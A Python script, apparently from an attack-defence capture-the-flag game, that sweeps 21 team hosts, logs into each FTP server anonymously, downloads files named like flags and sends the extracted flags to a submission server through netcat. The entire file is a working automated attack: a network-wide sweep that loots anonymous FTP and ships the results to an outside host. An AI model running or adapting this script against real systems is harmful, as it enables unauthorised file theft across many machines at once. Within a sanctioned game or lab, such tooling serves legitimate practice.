import ftplib
import re
import subprocess

n_equipos = 21
targets = [f'10.66.{i}.4' for i in range(1, n_equipos + 1)]
port = 21
flag_pattern = re.compile(r'cdm_.+')
flag_submission_ip = ""

def submit_flag(flag):
    try:
        proc = subprocess.run(
            ["nc", flag_submission_ip, "31337"],
            input=flag.encode(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3
        )
        print(f"[+] Subida flag: {flag.strip()} -> {proc.stdout.decode().strip()}")
    except Exception as e:
        print(f"[!] Error al subir flag: {e}")

for ip in targets:
    try:
        print(f"[+] Conectando a {ip}:{port}")
        ftp = ftplib.FTP()
        ftp.connect(ip, port, timeout=3)
        ftp.login("anonymous", "anonymous@")
        
        archivos = ftp.nlst()
        print(f"    Archivos en {ip}: {archivos}")
        
        for archivo in archivos:
            if "flag" in archivo.lower():
                with open("tmp_flag.txt", "wb") as f:
                    ftp.retrbinary(f"RETR {archivo}", f.write)
                
                with open("tmp_flag.txt", "r") as f:
                    contenido = f.read()
                    match = flag_pattern.search(contenido)
                    if match:
                        flag = match.group(0)
                        print(f"[+] Flag encontrada en {ip}: {flag}")
                        submit_flag(flag)
                    else:
                        print(f"[-] No se encontr√≥ flag en {archivo}")
        
        ftp.quit()
    except Exception as e:
        print(f"[!] Error en {ip}: {e}")
